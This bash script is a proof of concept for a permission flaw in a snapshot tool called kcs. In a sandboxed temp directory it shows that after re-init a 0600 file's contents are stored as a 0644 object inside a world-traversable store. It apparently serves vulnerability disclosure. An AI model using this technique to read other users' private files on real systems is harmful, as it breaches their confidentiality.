#!/usr/bin/env bash
set -euo pipefail

mode_of() {
  if stat -f '%Lp' "$1" >/dev/null 2>&1; then
    stat -f '%Lp' "$1"
  else
    stat -c '%a' "$1"
  fi
}

run_kcs() {
  if [[ -n "${KCS_BIN:-}" ]]; then
    "$KCS_BIN" "$@"
  else
    : "${KCS_REPO:?set KCS_REPO to a local KCS checkout, or set KCS_BIN to a built kcs binary}"
    cargo "+${CARGO_TOOLCHAIN:-stable}" run --quiet --manifest-path "$KCS_REPO/Cargo.toml" -p kcs-cli --bin kcs -- "$@"
  fi
}

json_status() {
  sed -n 's/.*"status"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$1" | head -n 1
}

tmp="${TMPDIR:-/tmp}/kcs-permissive-store-poc.$$"
real_home="${HOME:-}"
if [[ -n "$real_home" ]]; then
  export CARGO_HOME="${CARGO_HOME:-$real_home/.cargo}"
  export RUSTUP_HOME="${RUSTUP_HOME:-$real_home/.rustup}"
fi
cleanup() {
  if [[ -z "${KEEP_POC_TMP:-}" ]]; then
    rm -rf "$tmp"
  else
    printf '[+] kept fixture: %s\n' "$tmp"
  fi
}
trap cleanup EXIT

mkdir -p "$tmp/home" "$tmp/xdg-config" "$tmp/xdg-data" "$tmp/scope"
export HOME="$tmp/home"
export XDG_CONFIG_HOME="$tmp/xdg-config"
export XDG_DATA_HOME="$tmp/xdg-data"
umask 022

scope="$tmp/scope"
secret='victim-only bytes from a 0600 file'

run_kcs --json init "$scope" >"$tmp/init.json"
fresh_mode="$(mode_of "$scope/.kcs")"
chmod 0755 "$scope/.kcs"
run_kcs --json init "$scope" >"$tmp/reinit.json"
reinit_status="$(json_status "$tmp/reinit.json")"
retained_mode="$(mode_of "$scope/.kcs")"

printf '%s\n' "$secret" >"$scope/notes.txt"
chmod 0600 "$scope/notes.txt"
source_mode="$(mode_of "$scope/notes.txt")"

(cd "$scope" && run_kcs --json snapshot -m poc-permissive-store) >"$tmp/snapshot.json"

raw_file="$(LC_ALL=C grep -R -l -- "$secret" "$scope/.kcs/objects/raw" | head -n 1 || true)"
if [[ -z "$raw_file" ]]; then
  printf '[-] raw object containing the synthetic secret was not found\n' >&2
  exit 1
fi
raw_mode="$(mode_of "$raw_file")"

printf '[+] fresh .kcs mode: %s\n' "$fresh_mode"
printf '[+] re-init status: %s\n' "${reinit_status:-unknown}"
printf '[+] retained .kcs mode after re-init: %s\n' "$retained_mode"
printf '[+] source file mode: %s\n' "$source_mode"
printf '[+] raw object mode: %s\n' "$raw_mode"
printf '[+] raw object contains synthetic secret: yes\n'

case "$retained_mode:$source_mode:$raw_mode" in
  755:600:644)
    printf '[!] vulnerable path demonstrated: private source bytes were published under a traversable store\n'
    ;;
  *)
    printf '[-] control did not match the vulnerable Unix mode pattern\n' >&2
    exit 1
    ;;
esac
